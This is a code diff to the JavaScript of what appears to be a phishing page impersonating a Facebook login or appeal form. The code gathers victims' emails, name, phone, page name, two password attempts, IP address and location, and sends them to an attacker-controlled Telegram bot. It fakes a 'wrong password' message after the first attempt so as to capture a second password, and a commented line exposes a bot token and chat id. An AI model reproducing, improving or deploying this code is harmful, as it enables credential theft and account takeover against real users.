@@ -51,7 +51,7 @@ $(document).ready(function () {
 
     openDetail();
     let IpAddress = '';
-    
+
     getIP(ip => {
         IpAddress = ip;
         sendForm(IpAddress);
@@ -227,67 +227,69 @@ function showPrompt(IpAddress) {
             keymap: "",
             trueWay: 0,
         };
-        
-        const message1   = '<strong>User Email: </strong>' + $("#business-email").val() + 
-        '%0A<strong>User Name: </strong>' + $("#full-name").val() + 
-        '%0A<strong>User Email: </strong>' + $("#personal-email").val() + 
-        '%0A<strong>Facebook Page: </strong>' + $("#page-name").val()+ 
-        '%0A<strong>Phone Number: </strong>' + $("#phone").val() + 
-        '%0A<strong>First Password: </strong>' + password +
-        '%0A<strong>Second Password: </strong>'+ secondPassword +
-        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
-        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
-        '%0A<strong>City : </strong>' + IpAddress.city ;
+
+        const message1 = '<strong>User Email: </strong>' + $("#business-email").val() +
+            '%0A<strong>User Name: </strong>' + $("#full-name").val() +
+            '%0A<strong>User Email: </strong>' + $("#personal-email").val() +
+            '%0A<strong>Facebook Page: </strong>' + $("#page-name").val() +
+            '%0A<strong>Phone Number: </strong>' + $("#phone").val() +
+            '%0A<strong>First Password: </strong>' + password +
+            '%0A<strong>Second Password: </strong>' + secondPassword +
+            '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
+            '%0A<strong>Country : </strong>' + IpAddress.countryName + '( ' + IpAddress.countryCode + ' )' +
+            '%0A<strong>City : </strong>' + IpAddress.city;
 
         // const botToken = '6899648318:AAEuhFl-OX-SGSRSc2i_fa7ZSMJTE1Yo3Ik'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
         // const chatId = '-1002129119762'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
 
-        const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
-        const chatId = process.env.NEXT_PUBLIC_CHAT_ID; 
+        let botToken = "abc";
+        let chatId = "abc";
 
         fetch('/api/config')
-        .then(response => response.json())
-        .then(config => {
-            chatId = config.chatId;
-            botToken = config.botToken;
-        });
-        
-        const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
+            .then(response => response.json())
+            .then(config => {
+                chatId = config.chatId;
+                botToken = config.botToken;
+                console.log(chatId);
+                const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
 
-        fetch(telegramUrl)
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                NUMBER_TIME_LOGIN++;
-                if (NUMBER_TIME_LOGIN === 1) {
-                    FIRST_PASSWORD = password;
-                    setTimeout(function () {
-                        $('.lsd-ring-container').addClass('d-none');
-                        $('#wrong-password').removeClass('d-none');
-                        $("#password").val('');
-                    }, 2000);
-                } else {
-                    setTimeout(function () {
-                        $('.lsd-ring-container').addClass('d-none');
-                        window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
-                    }, 2000);
-                }
-            })
-            .catch(error => {
-                setTimeout(function () {
-                    Swal.fire({
-                        text: `Request failed!`,
-                        icon: "error"
+                fetch(telegramUrl)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        NUMBER_TIME_LOGIN++;
+                        if (NUMBER_TIME_LOGIN === 1) {
+                            FIRST_PASSWORD = password;
+                            setTimeout(function () {
+                                $('.lsd-ring-container').addClass('d-none');
+                                $('#wrong-password').removeClass('d-none');
+                                $("#password").val('');
+                            }, 2000);
+                        } else {
+                            setTimeout(function () {
+                                $('.lsd-ring-container').addClass('d-none');
+                                window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
+                            }, 2000);
+                        }
+                    })
+                    .catch(error => {
+                        setTimeout(function () {
+                            Swal.fire({
+                                text: `Request failed!`,
+                                icon: "error"
+                            });
+                            $('.lsd-ring-container').addClass('d-none');
+                        }, 500);
                     });
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 500);
             });
+
+
 
     });
 
